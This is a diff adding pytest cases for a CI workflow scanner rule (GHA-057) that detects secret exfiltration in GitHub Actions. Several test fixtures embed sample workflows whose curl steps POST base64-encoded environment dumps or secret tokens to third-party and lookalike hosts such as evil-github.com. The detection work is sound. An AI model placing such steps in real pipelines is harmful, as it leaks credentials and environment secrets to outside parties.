@@ -208,6 +208,126 @@ class TestGHA057SecretScannerExfil:
         f = run_check(wf, "GHA-057")
         assert not f.passed
 
+    def test_fails_on_cicd_goat_scenario_24_body(self):
+        # Body lifted from cicd-goat scenario-24-third-party-webhook-exfil.
+        # No literal ``secrets.*`` reference; the exfil happens via
+        # ``$(env | base64)`` in the curl payload. The env-dump shape
+        # is enough to trigger the third detector even on a workflow
+        # that doesn't otherwise touch secrets.
+        wf = """
+        name: scenario-24-third-party-webhook-exfil
+        on:
+          push:
+          pull_request:
+        permissions:
+          contents: read
+        jobs:
+          notify:
+            if: false
+            runs-on: ubuntu-latest
+            steps:
+              - uses: actions/checkout@v4
+              - name: Build telemetry to third-party tracker (DANGER)
+                run: |
+                  curl -fsS -X POST "https://build-tracker.third-party.example/v1/events" \\
+                    -H "Content-Type: application/json" \\
+                    -d "$(jq -nc \\
+                        --arg repo  "$GITHUB_REPOSITORY" \\
+                        --arg actor "$GITHUB_ACTOR" \\
+                        --arg sha   "$GITHUB_SHA" \\
+                        --arg env_dump "$(env | base64 -w0)" \\
+                        '{repo:$repo, actor:$actor, sha:$sha, env_dump:$env_dump}')"
+        """
+        f = run_check(wf, "GHA-057")
+        assert not f.passed
+        assert "third-party host" in f.description
+
+    def test_fails_on_curl_post_with_secrets_interpolation_to_third_party(self):
+        wf = """
+        name: ci
+        on: push
+        jobs:
+          notify:
+            runs-on: ubuntu-latest
+            steps:
+              - run: |
+                  curl -X POST https://hooks.example.com/incoming \\
+                    -H "Authorization: Bearer ${{ secrets.OPS_TOKEN }}" \\
+                    -d "{}"
+        """
+        f = run_check(wf, "GHA-057")
+        assert not f.passed
+        assert "secrets.* interpolated" in f.description
+
+    def test_fails_on_curl_post_with_credential_env_var_to_third_party(self):
+        wf = """
+        name: ci
+        on: push
+        jobs:
+          notify:
+            runs-on: ubuntu-latest
+            env:
+              OPS_TOKEN: ${{ secrets.OPS_TOKEN }}
+            steps:
+              - run: |
+                  curl -X POST https://hooks.example.com/in \\
+                    -H "Authorization: Bearer $GITHUB_TOKEN"
+        """
+        f = run_check(wf, "GHA-057")
+        assert not f.passed
+        assert "credential env var" in f.description
+
+    def test_passes_on_curl_post_to_github_host(self):
+        # GitHub-owned host with secrets interpolation is the normal
+        # ``gh api`` / ``actions/upload-artifact`` shape — must not fire.
+        wf = """
+        name: ci
+        on: push
+        jobs:
+          notify:
+            runs-on: ubuntu-latest
+            steps:
+              - run: |
+                  curl -X POST https://api.github.com/repos/x/y/issues \\
+                    -H "Authorization: Bearer ${{ secrets.GH_PAT }}" \\
+                    -d '{"title":"hi"}'
+        """
+        f = run_check(wf, "GHA-057")
+        assert f.passed
+
+    def test_passes_on_curl_post_to_third_party_without_secret_material(self):
+        # ``curl POST`` to a third-party host without any secret
+        # interpolation, credential env, or env-dump shouldn't fire —
+        # the rule is exfil-shaped, not "any HTTP POST is bad".
+        wf = """
+        name: ci
+        on: push
+        jobs:
+          notify:
+            runs-on: ubuntu-latest
+            steps:
+              - run: |
+                  curl -X POST https://status.example.com/heartbeat \\
+                    -d '{"build":"ok"}'
+        """
+        f = run_check(wf, "GHA-057")
+        assert f.passed
+
+    def test_evil_lookalike_host_does_not_pass_allowlist(self):
+        wf = """
+        name: ci
+        on: push
+        jobs:
+          notify:
+            runs-on: ubuntu-latest
+            steps:
+              - run: |
+                  curl -X POST https://evil-github.com/x \\
+                    -d "$(env)"
+        """
+        f = run_check(wf, "GHA-057")
+        assert not f.passed
+
 
 # ── GHA-058 agentic CLI permission-bypass flags ──────────────────────
 
